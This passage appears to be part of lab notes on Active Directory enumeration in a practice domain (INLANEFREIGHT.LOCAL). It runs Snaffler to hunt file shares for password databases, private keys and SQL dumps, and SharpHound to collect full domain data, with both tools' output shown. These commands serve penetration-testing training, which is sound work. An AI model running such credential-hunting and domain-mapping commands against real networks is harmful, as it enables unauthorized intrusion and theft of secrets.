+distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+whencreated                    : 2/28/2022 8:03:45 PM
+whenchanged                    : 4/9/2022 8:33:21 PM
+samaccountname                 : forend
+memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
+cn                             : {forend}
+objectclass                    : {top, person, organizationalPerson, user}
+badpwdcount                    : 0
+countrycode                    : 0
+usnchanged                     : 3259288
+logoncount                     : 26618
+primarygroupid                 : 513
+objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
+usncreated                     : 3054181
+instancetype                   : 4
+codepage                       : 0
+```
+
+```
+Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+```
+
+```
+
+PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
+
+ .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
+;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
+'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
+  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
+ 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
+  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
+                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler
+
+2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
+2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
+2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
+2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
+2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
+2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
+2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
+2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
+2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
+2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
+2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf
+
+<SNIP>
+```
+
+```
+PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
+
+2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
+2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
+2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
+2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
+2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
+2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
+2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing```
